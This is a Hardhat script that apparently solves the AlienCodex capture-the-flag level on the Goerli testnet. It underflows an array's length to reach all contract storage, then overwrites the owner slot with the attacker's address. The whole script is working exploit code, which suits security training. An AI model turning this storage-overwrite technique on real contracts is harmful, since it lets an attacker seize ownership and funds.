// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");
const web3 = require("web3");
async function main() {

  /* 
  This level exploits the fact that the EVM doesn't validate an array's 
  ABI-encoded length vs its actual payload.
  Additionally, it exploits the arithmetic underflow of array length, 
  by expanding the array's bounds to the entire storage area of 2^256. 
  The user is then able to modify all contract storage. 
*/
  const goerliAccount="0x92e5c70Dd41824a0617e07271A7E1e81A9BcE064"
  const alienCodexAddr ="0x077724d211657E407B9C58f670608e08BC534259"
  const codexslotHash = web3.utils.soliditySha3("1");
  const indexowner=(BigInt(2**256)-BigInt(codexslotHash)).toString()
  const argument = "0x" + "0".repeat(24) + goerliAccount.slice(2)
  const Aliencodex = await hre.ethers.getContractAt("AlienCodex",alienCodexAddr);
  await Aliencodex.makeContact();
  await Aliencodex.retract();
  await Aliencodex.revise(indexowner,argument)
  console.log(
    `AlienCodex contact interacted! `,indexowner
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});